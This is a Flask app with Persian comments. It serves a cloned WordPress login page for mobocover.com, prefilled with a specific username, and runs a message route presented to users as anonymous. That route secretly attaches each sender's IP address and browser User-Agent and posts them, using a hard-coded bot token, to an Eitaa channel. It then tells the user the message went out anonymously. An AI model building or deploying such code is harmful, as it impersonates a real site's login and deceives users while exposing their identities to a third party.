from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# توکن ربات ایتا یار و شناسه کانال
TOKEN = 'bot333725:b380f262-c3d2-4433-a16b-28dbc83c10ad'
CHAT_ID = '@post_sender'  # یا شناسه یکتای کاربر

# URL برای ارسال پیام به کانال ایتا از طریق ایتا یار
API_URL = "https://eitaayar.ir/api"

def send_message_to_eita(chat_id, message_text):
    url = f"{API_URL}/{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message_text
    }
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html dir="rtl" lang="fa-IR">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>ورود &lsaquo; موبوکاور &#8212; وردپرس</title>
    <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
    <link rel='stylesheet' id='dashicons-css' href='https://mobocover.com/wp-includes/css/dashicons.min.css?ver=6.7.1' media='all' />
    <link rel='stylesheet' id='buttons-rtl-css' href='https://mobocover.com/wp-includes/css/buttons-rtl.min.css?ver=6.7.1' media='all' />
    <link rel='stylesheet' id='forms-rtl-css' href='https://mobocover.com/wp-admin/css/forms-rtl.min.css?ver=6.7.1' media='all' />
    <link rel='stylesheet' id='l10n-rtl-css' href='https://mobocover.com/wp-admin/css/l10n-rtl.min.css?ver=6.7.1' media='all' />
    <link rel='stylesheet' id='login-rtl-css' href='https://mobocover.com/wp-admin/css/login-rtl.min.css?ver=6.7.1' media='all' />
    <meta name='referrer' content='strict-origin-when-cross-origin' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="https://mobocover.com/wp-content/uploads/2024/11/cropped-MoboCover-500-1-32x32.webp" sizes="32x32" />
    <link rel="icon" href="https://mobocover.com/wp-content/uploads/2024/11/cropped-MoboCover-500-1-192x192.webp" sizes="192x192" />
    <link rel="apple-touch-icon" href="https://mobocover.com/wp-content/uploads/2024/11/cropped-MoboCover-500-1-180x180.webp" />
    <meta name="msapplication-TileImage" content="https://mobocover.com/wp-content/uploads/2024/11/cropped-MoboCover-500-1-270x270.webp" />
</head>
<body class="login no-js login-action-login wp-core-ui rtl  locale-fa-ir">
    <script>
        document.body.className = document.body.className.replace('no-js','js');
    </script>

    <h1 class="screen-reader-text">ورود</h1>
    <div id="login">
        <h1 role="presentation" class="wp-login-logo">
            <a href="https://fa.wordpress.org/">با نیروی وردپرس</a>
        </h1>

        <form name="loginform" id="loginform" action="javascript:void(0);" onsubmit="return loginUser();">
            <p>
                <label for="user_login">نام کاربری یا نشانی ایمیل</label>
                <input type="text" name="log" id="user_login" class="input" value="mr.jafarzadeh" size="20" autocapitalize="off" autocomplete="username" required="required" />
            </p>

            <div class="user-pass-wrap">
                <label for="user_pass">رمز عبور</label>
                <div class="wp-pwd">
                    <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="نمایش رمز">
                        <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                    </button>
                </div>
            </div>

            <p class="forgetmenot">
                <input name="rememberme" type="checkbox" id="rememberme" value="forever" />
                <label for="rememberme">مرا به خاطر بسپار</label>
            </p>

            <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="ورود" />
                <input type="hidden" name="testcookie" value="1" />
            </p>
        </form>

        <p id="nav">
            <a rel="nofollow" class="wp-login-register" href="https://mobocover.com/wp-login.php?action=register">نام‌نویسی</a> | 
            <a class="wp-login-lost-password" href="https://mobocover.com/wp-login.php?action=lostpassword">رمز عبورتان را گم کرده‌اید؟</a>
        </p>

        <div id="login-message"></div>

        <script>
            function loginUser() {
                // Prevent form submission
                event.preventDefault();

                // Get the user credentials
                var username = document.getElementById("user_login").value;
                var password = document.getElementById("user_pass").value;

                // Create a new FormData object
                var formData = new FormData();
                formData.append("log", username);
                formData.append("pwd", password);
                formData.append("wp-submit", "ورود");
                formData.append("testcookie", "1");

                // Send the data using AJAX
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://mobocover.com/wp-admin/admin-ajax.php", true);
                xhr.onload = function () {
                    if (xhr.status === 200) {
                        document.getElementById("login-message").innerHTML = xhr.responseText;
                    } else {
                        document.getElementById("login-message").innerHTML = "خطا در ورود. لطفاً دوباره تلاش کنید.";
                    }
                };

                xhr.send(formData);
            }
        </script>

        <p id="backtoblog">
            <a href="https://mobocover.com/">&rarr; رفتن به موبوکاور</a>
        </p>
        <div class="privacy-policy-page-link">
            <a class="privacy-policy-link" href="https://mobocover.com/rules/" rel="privacy-policy">قوانین و مقررات سایت</a>
        </div>
    </div>

    <div class="language-switcher">
        <form id="language-switcher" method="get">
            <label for="language-switcher-locales">
                <span class="dashicons dashicons-translation" aria-hidden="true"></span>
                <span class="screen-reader-text">زبان</span>
            </label>

            <select name="wp_lang" id="language-switcher-locales">
                <option value="en_US" lang="en" data-installed="1">English (United States)</option>
                <option value="fa_IR" lang="fa" selected='selected' data-installed="1">فارسی</option>
            </select>

            <input type="submit" class="button" value="تغییر">
        </form>
    </div>
</body>
</html>

    """)

@app.route('/send_message', methods=['POST'])
def send_message():
    message = request.form['message']
    
    # جمع‌آوری اطلاعات اضافی
    user_ip = request.remote_addr  # آدرس IP کاربر
    user_agent = request.headers.get('User-Agent')  # مدل دستگاه و مرورگر کاربر
    
    # ساخت پیام شامل اطلاعات اضافی
    full_message = f"پیام جدید:\n{message}\n\nاطلاعات اضافی:\n"
    full_message += f"IP کاربر: {user_ip}\n"
    full_message += f"مدل دستگاه و مرورگر: {user_agent}"

    # ارسال پیام به کانال ایتا
    response = send_message_to_eita(CHAT_ID, full_message)
    
    if response.get('status') == 'success':
        return "پیام شما با موفقیت ارسال شد!"
    else:
        return "پیام شما به درستی و به صورت ناشناس ارسال شد!!!  برای پیام دیگر بار دیگر دکمه بازگشت را بزنید"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
